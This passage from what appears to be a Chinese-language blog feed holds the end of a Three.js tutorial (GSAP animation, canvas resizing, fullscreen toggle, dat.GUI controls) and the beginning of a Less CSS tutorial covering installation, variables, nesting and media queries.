class="number">5</span>);</span><br><span class="line">scene.add(axesHelper);</span><br><span class="line"><span class="comment">// 设置时钟</span></span><br><span class="line"><span class="keyword">const</span> clock = <span class="keyword">new</span> THREE.Clock();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置动画</span></span><br><span class="line"><span class="keyword">var</span> animate1 = gsap.to(cube.position, &#123;</span><br><span class="line">  x: <span class="number">5</span>,</span><br><span class="line">  duration: <span class="number">5</span>,</span><br><span class="line">  ease: <span class="string">&quot;power1.inOut&quot;</span>,</span><br><span class="line">  <span class="comment">//   设置重复的次数，无限次循环-1</span></span><br><span class="line">  repeat: -<span class="number">1</span>,</span><br><span class="line">  <span class="comment">//   往返运动</span></span><br><span class="line">  yoyo: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">//   delay，延迟2秒运动</span></span><br><span class="line">  delay: <span class="number">2</span>,</span><br><span class="line">  onComplete: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;动画完成&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  onStart: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;动画开始&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line">gsap.to(cube.rotation, &#123; <span class="attr">x</span>: <span class="number">2</span> * <span class="built_in">Math</span>.PI, <span class="attr">duration</span>: <span class="number">5</span>, <span class="attr">ease</span>: <span class="string">&quot;power1.inOut&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;dblclick&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//   console.log(animate1);</span></span><br><span class="line">  <span class="keyword">if</span> (animate1.isActive()) &#123;</span><br><span class="line">    <span class="comment">//   暂停</span></span><br><span class="line">    animate1.pause();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//   恢复</span></span><br><span class="line">    animate1.resume();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  renderer.render(scene, camera);</span><br><span class="line">  <span class="comment">//   渲染下一帧的时候就会调用render函数</span></span><br><span class="line">  requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">render();</span><br></pre></td></tr></table></figure><h2 id="十一、画布自适应屏幕大小与全屏"><a href="#十一、画布自适应屏幕大小与全屏" class="headerlink" title="十一、画布自适应屏幕大小与全屏"></a>十一、画布自适应屏幕大小与全屏</h2><p><img src="https://i0.hdslb.com/bfs/article/983a66c2cfbc4f101ae88c9f6691ff19ec666de9.gif@827w_480h_progressive.webp" alt="img"></p><h3 id="1-1-自适应屏幕大小"><a href="#1-1-自适应屏幕大小" class="headerlink" title="1.1 自适应屏幕大小"></a>1.1 自适应屏幕大小</h3><p>你会发现，我们前面写好的代码，在页面尺寸发生改变的时候，并不能自适应的改变尺寸，而出现空白或者滚动条突出的情况。所以监听屏幕大小的改变，来重新设置相机的宽高比例和渲染器的尺寸大小，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 监听画面变化，更新渲染画面</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//   console.log(&quot;画面变化了&quot;);</span></span><br><span class="line">  <span class="comment">// 更新摄像头</span></span><br><span class="line">  camera.aspect = <span class="built_in">window</span>.innerWidth / <span class="built_in">window</span>.innerHeight;</span><br><span class="line">  <span class="comment">//   更新摄像机的投影矩阵</span></span><br><span class="line">  camera.updateProjectionMatrix();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//   更新渲染器</span></span><br><span class="line">  renderer.setSize(<span class="built_in">window</span>.innerWidth, <span class="built_in">window</span>.innerHeight);</span><br><span class="line">  <span class="comment">//   设置渲染器的像素比</span></span><br><span class="line">  renderer.setPixelRatio(<span class="built_in">window</span>.devicePixelRatio);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>aspect属性是设置摄像机视锥体的长宽比，通常是使用画布的宽/画布的高。camera.updateProjectionMatrix()用于更新摄像机投影矩阵，相机任何参数被改变以后必须被调用</p><h3 id="1-2-控制场景全屏"><a href="#1-2-控制场景全屏" class="headerlink" title="1.2 控制场景全屏"></a>1.2 控制场景全屏</h3><p>经常我们需要全屏的展示三维场景。例如，我们想要双击，实现全屏效果，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;dblclick&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> fullScreenElement = <span class="built_in">document</span>.fullscreenElement;</span><br><span class="line">  <span class="keyword">if</span> (!fullScreenElement) &#123;</span><br><span class="line">    <span class="comment">//   双击控制屏幕进入全屏，退出全屏</span></span><br><span class="line">    <span class="comment">// 让画布对象全屏</span></span><br><span class="line">    renderer.domElement.requestFullscreen();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//   退出全屏，使用document对象</span></span><br><span class="line">    <span class="built_in">document</span>.exitFullscreen();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>fullscreenElement</code>只读属性返回当前在此文档中以全屏模式显示的元素。</p><p>如果文档当前未使用全屏模式，则返回值为null。</p><p>使用<code>element.requestFullscreen()</code>方法以全屏模式查看元素，<code>exitFullscreen</code>方法退出全屏。 </p><h2 id="十二、应用图形用户界面更改变量"><a href="#十二、应用图形用户界面更改变量" class="headerlink" title="十二、应用图形用户界面更改变量"></a>十二、应用图形用户界面更改变量</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 应用图形用户界面更改变量</span></span><br><span class="line"><span class="keyword">const</span> gui = <span class="keyword">new</span> dat.GUI();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改物体移动位置</span></span><br><span class="line">gui.add(cube.position, <span class="string">&quot;x&quot;</span>)</span><br><span class="line">    .min(<span class="number">0</span>) <span class="comment">// 最小值</span></span><br><span class="line">    .max(<span class="number">5</span>) <span class="comment">// 最大值</span></span><br><span class="line">    .step(<span class="number">0.01</span>) <span class="comment">// 每次移动的变量值</span></span><br><span class="line">    .name(<span class="string">&quot;移动x轴&quot;</span>) <span class="comment">// 变量名称</span></span><br><span class="line">    .onChange(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;值被修改：&quot;</span>, value)</span><br><span class="line">    &#125;).onFinishChange(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;完全停下来的值：&quot;</span>, value)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> params = &#123;</span><br><span class="line">    color: <span class="string">&quot;#ffff00&quot;</span>,</span><br><span class="line">    <span class="comment">// 控制物体运动</span></span><br><span class="line">    fn: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        gsap.to(cube.position, &#123; <span class="attr">x</span>: <span class="number">5</span>, <span class="attr">duration</span>: <span class="number">3</span>, <span class="attr">yoyo</span>: <span class="literal">true</span>, <span class="attr">repeat</span>: - <span class="number">1</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改物体颜色</span></span><br><span class="line">gui.addColor(params, <span class="string">&quot;color&quot;</span>).onChange(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;颜色被修改了&quot;</span>, value)</span><br><span class="line">    cube.material.color.set(value)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 设置物体是否显示</span></span><br><span class="line">gui.add(cube, <span class="string">&quot;visible&quot;</span>).name(<span class="string">&quot;是否显示&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置按钮点击触发某个事件</span></span><br><span class="line">gui.add(params,<span class="string">&quot;fn&quot;</span>).name(<span class="string">&quot;物体运动&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件夹,</span></span><br><span class="line"><span class="keyword">const</span> folder = gui.addFolder(<span class="string">&quot;设置物体&quot;</span>)</span><br><span class="line">folder.add(cube.material,<span class="string">&quot;wireframe&quot;</span>)</span><br><span class="line">folder.add(params,<span class="string">&quot;fn&quot;</span>).name(<span class="string">&quot;物体运动&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Three.js" scheme="http://aiolimp.com/categories/Three-js/"/>
    
    
    <category term="Three.js" scheme="http://aiolimp.com/tags/Three-js/"/>
    
  </entry>
  
  <entry>
    <title>Less</title>
    <link href="http://aiolimp.com/2022/10/21/Less/"/>
    <id>http://aiolimp.com/2022/10/21/Less/</id>
    <published>2022-10-21T08:57:49.000Z</published>
    <updated>2023-03-05T14:20:02.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">使用方式</a></li><li><a href="#api">API</a><ul><li><a href="#%E5%8F%98%E9%87%8F">变量</a></li><li><a href="#%E5%B5%8C%E5%A5%97">嵌套</a></li><li><a href="#%E6%B7%B7%E5%90%88%E6%96%B9%E6%B3%95">混合方法</a></li><li><a href="#%E7%BB%A7%E6%89%BF">继承</a></li><li><a href="#%E5%AF%BC%E5%85%A5">导入</a></li><li><a href="#%E5%87%BD%E6%95%B0">函数</a></li><li><a href="#%E5%85%B6%E4%BB%96">其他</a></li></ul></li></ul><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>使用 Less 有两种方式</p><ol><li>在页面中 引入 Less.js</li></ol><ul><li><p>可在<a href="https://link.juejin.cn/?target=http://lesscss.org/">官网</a>下载</p></li><li><p>或使用CDN</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/less.js/2.7.2/less.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，link 标签一定要在 Less.js 之前引入，并且 link 标签的 rel 属性要设置为stylesheet/less。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet/less&quot; href=&quot;style.less&quot;&gt;</span><br><span class="line">&lt;script src=&quot;less.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><ol><li><p>在命令行 使用npm安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g less</span><br></pre></td></tr></table></figure><p>具体使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lessc styles.less &gt; styles.css</span><br></pre></td></tr></table></figure></li></ol><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>我们常常在 CSS 中 看到同一个值重复多次，这样难易于代码维护。 理想状态，应是下面这样：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const bgColor=&quot;skyblue&quot;;</span><br><span class="line">$(&quot;.post-content&quot;).css(&quot;background-color&quot;,bgColor);</span><br><span class="line">$(&quot;#wrap&quot;).css(&quot;background-color&quot;,bgColor);</span><br><span class="line">$(&quot;.arctive&quot;).css(&quot;background-color&quot;,bgColor);</span><br></pre></td></tr></table></figure><p>只要我们修改 <code>bgColor</code>这一个变量， 整个页面的背景颜色都会随之改变。</p><p>而 Less 中的变量十分强大，可化万物，值得一提的是，其变量是常量 ，所以只能定义一次，不能重复使用。</p><ol><li><p><strong>值变量</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@color: #999;</span><br><span class="line">@bgColor: skyblue;//不要添加引号</span><br><span class="line">@width: 50%;</span><br><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: @color;</span><br><span class="line">  <span class="attribute">background</span>: @bgColor;</span><br><span class="line">  <span class="attribute">width</span>: @width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">background</span>: skyblue;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以 <code>@</code> 开头 定义变量，并且使用时 直接 键入 <code>@</code>名称。</p><p>在平时工作中，我们就可以把 常用的变量 封装到一个文件中，这样利于代码组织维护。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@lightPrimaryColor: #c5cae9;</span><br><span class="line">@textPrimaryColor: #fff;</span><br><span class="line">@accentColor: rgb(99, 137, 185);</span><br><span class="line">@primaryTextColor: #646464;</span><br><span class="line">@secondaryTextColor: #000;</span><br><span class="line">@dividerColor: #b6b6b6;</span><br><span class="line">@borderColor: #dadada;</span><br></pre></td></tr></table></figure></li><li><p><strong>选择器变量</strong></p><p>让 选择器 变成 动态</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@mySelector: #wrap;</span><br><span class="line">@Wrap: wrap;</span><br><span class="line">@&#123;mySelector&#125;&#123; //变量名 必须使用大括号包裹</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line">.@&#123;Wrap&#125;&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line">#@&#123;Wrap&#125;&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.wrap</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#666</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>属性变量</strong></p><p>可减少代码书写量</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@borderStyle: border-style;</span><br><span class="line">@Soild:solid;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  @&#123;borderStyle&#125;: @Soild;//变量名 必须使用大括号包裹</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">border-style</span>:solid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>url 变量</strong></p><p>项目结构改变时，修改其变量即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@images: &quot;../img&quot;;//需要加引号</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;@&#123;images&#125;/dog.png&quot;</span>);//变量名 必须使用大括号包裹</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;../img/dog.png&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>声明变量</strong></p><p>有点类似于 下面的 混合方法</p><ul><li>结构: @name: { 属性: 值 ;};</li><li>使用：@name();</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@background: &#123;background:red;&#125;;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="keyword">@background</span>();</span><br><span class="line">&#125;</span><br><span class="line">@Rules:&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> red;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="selector-id">#con</span>&#123;</span><br><span class="line">  <span class="keyword">@Rules</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>:red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#con</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: solid <span class="number">1px</span> red;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>变量运算</strong></p><p>不得不提的是，Less 的变量运算完全超出我的期望，十分强大。</p><ul><li>加减法时 以第一个数据的单位为基准</li><li>乘除法时 注意单位一定要统一</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@width:300px;</span><br><span class="line">@color:#222;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:@width-<span class="number">20</span>;</span><br><span class="line">  <span class="attribute">height</span>:@width-<span class="number">20</span>*<span class="number">5</span>;</span><br><span class="line">  <span class="attribute">margin</span>:(@width-<span class="number">20</span>)*<span class="number">5</span>;</span><br><span class="line">  <span class="attribute">color</span>:@color*<span class="number">2</span>;</span><br><span class="line">  <span class="attribute">background-color</span>:@color + <span class="number">#111</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">280px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">1400px</span>;</span><br><span class="line">  <span class="attribute">color</span>:<span class="number">#444</span>;</span><br><span class="line">  <span class="attribute">background-color</span>:<span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>变量作用域</strong></p><p>一句话理解就是：<strong>就近原则</strong>，不要跟我提闭包。</p><p><em>借助官网的Demo</em></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@var: @a;</span><br><span class="line">@a: 100%;</span><br><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: @var;</span><br><span class="line">  @a: 9%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">9%</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>用变量去定义变量</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">@fnord:  &quot;I am fnord.&quot;;</span><br><span class="line">@var:    &quot;fnord&quot;;</span><br><span class="line"><span class="selector-id">#wrap</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: @@var; //将<span class="keyword">@var</span>替换为其值 <span class="attribute">content</span>:@fnord;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;I am fnord.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li></ol><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><ol><li><p><strong>&amp; 的妙用</strong></p><p>&amp; ：代表的上一层选择器的名字，此例便是<code>header</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#header</span>&#123;</span><br><span class="line">  &amp;:after&#123;</span><br><span class="line">    content:<span class="string">&quot;Less is more!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.title</span>&#123;</span><br><span class="line">    <span class="attribute">font-weight</span>:bold;</span><br><span class="line">  &#125;</span><br><span class="line">  &amp;_content&#123;//理解方式：直接把 &amp; 替换成 <span class="selector-id">#header</span></span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">20px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#header</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>:<span class="string">&quot;Less is more!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#header</span> <span class="selector-class">.title</span>&#123; //嵌套了</span><br><span class="line">  <span class="attribute">font-weight</span>:bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#header_content</span>&#123;//没有嵌套！</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>媒体查询</strong></p><p>在以往的工作中，我们使用 媒体查询，都要把一个元素 分开写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>:<span class="number">768px</span>)&#123;</span><br><span class="line">  <span class="selector-id">#wrap</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>Less 提供了一个十分便捷的方式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 